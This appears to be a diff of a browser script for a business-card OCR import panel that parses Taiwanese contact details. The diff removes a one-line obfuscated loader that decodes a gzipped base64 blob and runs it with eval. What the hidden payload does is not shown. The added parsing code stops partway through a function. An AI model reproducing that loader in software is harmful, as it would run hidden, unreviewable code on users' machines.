@@ -1,1 +1,751 @@
-(()=>{const b='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';const x=Uint8Array.from(atob(b),c=>c.charCodeAt(0));new Response(new Blob([x]).stream().pipeThrough(new DecompressionStream('gzip'))).text().then(s=>(0,eval)(s));})();
+(function () {
+  const PANEL_ID = "customer-card-import-panel";
+  const MODAL_ID = "customer-card-ocr-modal";
+  const STYLE_ID = "customer-card-ocr-style";
+  const TESSERACT_SRC = "https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js";
+
+  function normalizeText(value) {
+    return String(value || "")
+      .normalize("NFKC")
+      .replace(/\r/g, "\n")
+      .replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/g, "")
+      .replace(/[\u200B-\u200F\u202A-\u202E\u2060-\u206F]/g, "")
+      .replace(/[\uE000-\uF8FF\uFFF0-\uFFFF]/g, "")
+      .replace(/[﹕︰]/g, ":")
+      .replace(/[‐‑‒–—―]/g, "-")
+      .replace(/[|｜·•●◆◇■□▲△▼▽★☆]/g, " ")
+      .replace(/[^\S\n]+/g, " ")
+      .replace(/\n{3,}/g, "\n\n")
+      .trim();
+  }
+
+  function clean(value) {
+    return normalizeText(value).replace(/\s+/g, " ").trim();
+  }
+
+  function compactChineseText(value) {
+    return clean(value)
+      .replace(/([\u4e00-\u9fff])\s+(?=[\u4e00-\u9fff0-9])/g, "$1")
+      .replace(/(\d)\s+(?=[\u4e00-\u9fff])/g, "$1");
+  }
+
+  function usefulCount(value) {
+    const matches = String(value || "").match(/[\u4e00-\u9fffA-Za-z0-9@]/g);
+    return matches ? matches.length : 0;
+  }
+
+  function splitLines(text) {
+    return normalizeText(text)
+      .split("\n")
+      .map(clean)
+      .filter((line) => {
+        if (!line) return false;
+        if (/^(logo|your name|you name|name|company name|company|design|sample)$/i.test(line)) return false;
+        return !(line.length >= 6 && usefulCount(line) / line.length < 0.35);
+      });
+  }
+
+  function firstMatch(text, regex) {
+    const match = String(text || "").match(regex);
+    return match ? clean(match[1] || match[0]) : "";
+  }
+
+  function removePhoneDigits(text) {
+    let result = String(text || "");
+    for (const phone of phoneMatches(result)) {
+      const digits = phone.replace(/[^\d]/g, "");
+      result = result.replace(new RegExp(digits.split("").join("[\\s.-]*")), " ");
+    }
+    return result;
+  }
+
+  function stripLabel(line, labels) {
+    let text = clean(line);
+    for (const label of labels) text = text.replace(label, "");
+    return clean(text.replace(/^[\s:：-]+|[\s:：-]+$/g, ""));
+  }
+
+  function normalizePhone(value) {
+    let digits = clean(value).replace(/[Oo]/g, "0").replace(/[^\d]/g, "");
+    if (digits.startsWith("886")) digits = `0${digits.slice(3)}`;
+    if (digits.length === 9 && digits.startsWith("9")) digits = `0${digits}`;
+    if (/^09\d{8}$/.test(digits)) return `${digits.slice(0, 4)}-${digits.slice(4, 7)}-${digits.slice(7)}`;
+    if (/^02\d{8}$/.test(digits)) return `${digits.slice(0, 2)}-${digits.slice(2, 6)}-${digits.slice(6)}`;
+    if (/^0[3-8]\d{8}$/.test(digits)) return `${digits.slice(0, 2)}-${digits.slice(2, 6)}-${digits.slice(6)}`;
+    if (/^0[3-8]\d{7}$/.test(digits)) return `${digits.slice(0, 2)}-${digits.slice(2, 5)}-${digits.slice(5)}`;
+    return "";
+  }
+
+  function phoneMatches(line) {
+    const text = clean(line).replace(/[Oo]/g, "0");
+    const patterns = [
+      /(?:\+?886[\s-]?)?0?9\d{2}[\s-]?\d{3}[\s-]?\d{3}/g,
+      /(?:\+?886[\s-]?)?0[2-8][\s-]?\d{3,4}[\s-]?\d{4}/g,
+      /\(0[2-8]\)\s*\d{3,4}[\s-]?\d{4}/g,
+      /0[2-8]\s+\d{3,4}\s+\d{4}/g,
+    ];
+    const result = [];
+    for (const pattern of patterns) {
+      for (const match of text.match(pattern) || []) {
+        const phone = normalizePhone(match);
+        if (phone && !result.includes(phone)) result.push(phone);
+      }
+    }
+    return result;
+  }
+
+  const ADDRESS_RE = /(?:台北市|臺北市|新北市|桃園市|台中市|臺中市|台南市|臺南市|高雄市|基隆市|新竹市|嘉義市|新竹縣|苗栗縣|彰化縣|南投縣|雲林縣|嘉義縣|屏東縣|宜蘭縣|花蓮縣|台東縣|臺東縣|澎湖縣|金門縣|連江縣)[^\n@]{0,80}(?:路|街|巷|弄|號|樓|室)[^\n@]*/;
+  const COMPANY_SUFFIX_RE = /(股份有限公司|有限公司|工程行|企業社|商行|工作室|設計室|事務所|公司|行號)$/;
+  const ROLE_RE = /(總經理|副總經理|董事長|負責人|聯絡人|店長|銷售部經理|業務部經理|採購部經理|工程部經理|銷售|業務|採購|主任|協理|副理|經理|專員|助理)/g;
+
+  function isFaxLine(line) {
+    return /(Fax|F\W*a\W*x|傳真)/i.test(line);
+  }
+
+  function isTaxLine(line) {
+    return /(統\s*一\s*編\s*號|統\s*編|公司\s*統\s*編|Tax\s*ID|VAT|UBN|Unified\s*Business\s*No)/i.test(line);
+  }
+
+  function isAddressLine(line) {
+    return ADDRESS_RE.test(line) || /(地址|公司地址|Add|Address)/i.test(line);
+  }
+
+  function isInfoLabelLine(line) {
+    return isTaxLine(line) || isFaxLine(line) || /(地址|電話|手機|Tel|TEL|Mobile|Phone|Email|Mail|網址|www\.|https?:\/\/)/i.test(line);
+  }
+
+  function findPhone(lines, mobileOnly) {
+    const preferred = lines.filter((line) => {
+      if (isTaxLine(line) || isFaxLine(line)) return false;
+      return mobileOnly ? /(09|\+?886\s*9|手機|Mobile)/i.test(line) : /(Tel|TEL|電話|公司電話)/i.test(line);
+    });
+    const candidates = preferred.length ? preferred : lines;
+    for (const line of candidates) {
+      if (isTaxLine(line) || isFaxLine(line)) continue;
+      for (const phone of phoneMatches(line)) {
+        if (mobileOnly && !phone.startsWith("09")) continue;
+        if (!mobileOnly && phone.startsWith("09")) continue;
+        return phone;
+      }
+    }
+    return "";
+  }
+
+  function cleanCompanyCandidate(line) {
+    return compactChineseText(stripLabel(line, [/客戶\s*\/\s*案場名稱/i, /公司名稱/i, /Company\s*Name/i, /客戶名稱/i]))
+      .replace(/股份有限公司/g, "股份有限公司")
+      .replace(/有限公司/g, "有限公司")
+      .replace(/\s*(?:公司\s*)?(?:統一編號|統編|電話|傳真|地址|Tel|TEL|Fax|Mobile|Phone|Email|Mail).*$/i, "")
+      .replace(/(?:統一編號|統編|電話|傳真|地址|Tel|TEL|Fax|Mobile|Phone|Email|Mail).*/i, "")
+      .replace(/\d[\d\s().-]{5,}\d/g, "")
+      .replace(/[A-Za-z]{1,6}$/g, "")
+      .replace(/^[^\u4e00-\u9fff]+|[^\u4e00-\u9fffA-Za-z0-9]+$/g, "")
+      .trim();
+  }
+
+  function scoreCompanyLine(line) {
+    const text = cleanCompanyCandidate(line);
+    if (!text || /@|https?:\/\/|www\./i.test(text)) return -20;
+    if (phoneMatches(text).length) return -12;
+    if (isInfoLabelLine(line) && !COMPANY_SUFFIX_RE.test(text)) return -12;
+    if (/^(銷售部|業務部|採購部|客服部|設計部|工程部|銷售部經理|業務部經理|經理|負責人|聯絡人)$/i.test(text)) return -12;
+    if (ADDRESS_RE.test(text) || /[縣市區鄉鎮].*(路|街|巷|弄|號)/.test(text)) return -12;
+    if (/\d/.test(text) && !COMPANY_SUFFIX_RE.test(text)) return -8;
+    let score = 0;
+    const hasSuffix = COMPANY_SUFFIX_RE.test(text);
+    const hasIndustry = /(建材|材料|五金|家具|傢俱|水果|工程|設計|股份|有限|商行|企業|室內|裝修|水電|行銷|科技|貿易)/.test(text);
+    if (hasSuffix) score += 12;
+    if (hasIndustry) score += 3;
+    const chinese = (text.match(/[\u4e00-\u9fff]/g) || []).length;
+    if (chinese >= 4) score += 4;
+    if (!hasSuffix && !hasIndustry && chinese < 6) score -= 6;
+    if (text.length > 28) score -= 2;
+    return score;
+  }
+
+  function findCompanyLine(lines) {
+    let best = "";
+    let bestScore = -99;
+    for (const line of lines) {
+      const score = scoreCompanyLine(line);
+      if (score > bestScore) {
+        best = line;
+        bestScore = score;
+      }
+    }
+    return bestScore >= 4 ? cleanCompanyCandidate(best) : "";
+  }
+
+  function findAddressLine(lines) {
+    return (
+      lines.find((line) => ADDRESS_RE.test(line)) ||
+      lines.find((line) => /(地址|公司地址|Add|Address)/i.test(line) && usefulCount(line) >= 5) ||
+      ""
+    );
+  }
+
+  function cleanAddressCandidate(line) {
+    let text = stripLabel(line, [/公司地址/i, /地址/i, /Add/i, /Address/i]);
+    text = removePhoneDigits(text);
+    text = text
+      .replace(/(?:TEL|Tel|電話|手機|Mobile|Phone|Fax|傳真)\s*[:：]?/gi, " ")
+      .replace(/(?:統一編號|統編)\s*[:：]?\s*\d{8}/g, " ")
+      .replace(/\b(?:04|02|03|05|06|07|08|09)[\d\s.-]{6,}\b/g, " ");
+    const match = text.match(ADDRESS_RE);
+    return compactChineseText(match ? match[0] : text);
+  }
+
+  function detectRole(line) {
+    const compact = compactChineseText(line).replace(/\s+/g, "");
+    if (/銷售部.*經理|銷售.*經理/.test(compact)) return "銷售部 經理";
+    if (/業務部.*經理|業務.*經理/.test(compact)) return "業務部 經理";
+    const role = firstMatch(compact, /(總經理|副總經理|董事長|負責人|聯絡人|店長|採購|主任|協理|副理|經理|業務)/);
+    return role;
+  }
+
+  function normalizeContactName(name, joined) {
